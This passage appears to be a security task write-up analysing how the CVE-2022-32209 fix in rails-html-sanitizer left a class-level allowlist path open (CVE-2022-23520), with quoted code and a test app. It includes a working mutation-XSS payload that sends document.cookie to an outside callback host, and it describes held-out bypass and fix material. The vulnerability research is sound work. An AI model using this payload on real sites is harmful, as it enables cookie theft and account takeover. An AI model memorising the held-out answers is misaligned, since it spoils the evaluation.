  serialization the mutation XSS depends on.

--------------------------------------------------------------------------------
SANITIZER SCRUB EVOLUTION (verbatim, lib/rails/html/sanitizer.rb, Rails::Html::SafeListSanitizer)
--------------------------------------------------------------------------------

V0 (1.4.2) -- no combination scrub:
      def allowed_tags(options)
        options[:tags] || self.class.allowed_tags
      end

V1 (1.4.3) -- CVE-2022-32209 fix (the GIVEN patch, patch.diff):
      def loofah_using_html5?
        # future-proofing, see https://github.com/flavorjones/loofah/pull/239
        Loofah.respond_to?(:html5_mode?) && Loofah.html5_mode?
      end

      def remove_safelist_tag_combinations(tags)
        if !loofah_using_html5? && tags.include?("select") && tags.include?("style")
          warn("WARNING: #{self.class}: removing 'style' from safelist, should not be combined with 'select'")
          tags.delete("style")
        end
        tags
      end

      def allowed_tags(options)
        if options[:tags]
          remove_safelist_tag_combinations(options[:tags])   # <-- guarded ONLY on the :tags branch
        else
          self.class.allowed_tags                            # <-- CLASS-LEVEL fallback, NOT guarded
        end
      end

  ==> THE INCOMPLETE FIX: remove_safelist_tag_combinations (delete "style" when "select" also allowed)
      is wired in ONLY on the per-call options[:tags] branch. An app that overrides allowed tags
      GLOBALLY -- config.action_view.sanitized_allowed_tags = [...] / SafeListSanitizer.allowed_tags =
      [...] -- and calls sanitize(html) with NO :tags option takes the `else` branch, which never runs
      the scrub. "style" stays in the safelist and the HTML4-CDATA mXSS remains reachable. That is
      CVE-2022-23520 (GHSA-rrfc-7g8p-99q8): "due to an incomplete fix of CVE-2022-32209 ... may allow
      an attacker to inject content if the application developer has overridden the sanitizer's allowed
      tags to allow both 'select' and 'style' elements."
      (NB: the `!loofah_using_html5?` guard is not the bug on its own -- with loofah 2.19.1 it is TRUE,
      so the scrub DOES run on the :tags path; the gap is the branch, not the html5 predicate.)

V2 (1.4.4) -- CVE-2022-23520 fix (COMPLETE, held out): remove_safelist_tag_combinations REMOVED
  entirely; the scrubber now escapes everything the HTML4 parser treats as CDATA
  (lib/rails/html/scrubbers.rb):
      -  if node.cdata?
      -    text = node.document.create_text_node node.text
      -    node.replace text
      +  if Loofah::HTML5::Scrub.cdata_needs_escaping?(node)
      +    replacement = Loofah::HTML5::Scrub.cdata_escape(node)
      +    node.replace(replacement)
  (requires loofah >= 2.19.1; gemspec bumped loofah "~> 2.3" -> "~> 2.19", ">= 2.19.1".)
  Now the <style> CDATA <img> is serialized as &lt;img ... &gt; regardless of how tags were
  configured -> mutation neutralized on BOTH the :tags and class-level paths.

--------------------------------------------------------------------------------
SINK APP (identical across v0/v1/v2; only the gem version differs, build-arg RHS_VER)
--------------------------------------------------------------------------------
Rack/WEBrick + Sinatra service running the REAL Rails::Html::SafeListSanitizer over an allowlist
that OVERRIDES the default to include BOTH `select` and `style` (+ svg/math foreign-content wrappers)
-- the CVE-2022-23520 precondition. Two request modes reproduce the exact API distinction:
  /?mode=tags &html=...  -> sanitize(html, tags: OVERRIDE.dup)   (PER-CALL :tags -> hit by CVE-2022-32209 seed)
  /?mode=class&html=...  -> sanitize(html) with SafeListSanitizer.allowed_tags = OVERRIDE  (CVE-2022-23520 residual path)
(The :tags array is dup'd per call because 1.4.3's remove_safelist_tag_combinations mutates it in
place via tags.delete("style"); a frozen array would raise FrozenError -- real callers pass a mutable
Array.)

--------------------------------------------------------------------------------
ORIGINAL (CVE-2022-32209) vs RESIDUAL (CVE-2022-23520) PAYLOADS
--------------------------------------------------------------------------------
IDENTICAL payload for both; only the API path differs (per-call :tags vs class-level allowed_tags):

  <svg><style><img src=x onerror="document.location='//callback:9000/c?f='+document.cookie"></style></svg>

  original_poc.py  -> sends it via mode=tags  (per-call :tags)      -> the 1.4.3 guard fires
  _heldout/bypass_poc.py -> sends it via mode=class (class-level)   -> the 1.4.3 guard is skipped

WHY the svg+style vehicle (not plain select+style): the GUARD under test is 1.4.3's select+style
SAFELIST scrub, which is armed by the allowlist containing both `select` and `style` and DELETES
`style` from the safelist -- neutralizing EVERY style-based mXSS (svg/math/select). The browser-
execution vehicle must be foreign content: empirically, plain <select><style><img onerror> is
NON-executing in modern Chromium (the "in select" insertion mode drops the <img>; measured: no flag),
and a </select>-breakout is stripped by libxml2 >= 2.9.12 (measured across nokogiri 1.13.0/1.13.3/
1.13.6/1.13.10). Inside <svg>/<math> foreign content the browser pulls the <img> OUT of the <style>
CDATA into live element context so onerror fires (measured: EXEC). This is the same HTML4-CDATA-under-
<style> mXSS class that the class-level gap leaves reachable and that 1.4.4's cdata_escape closes.

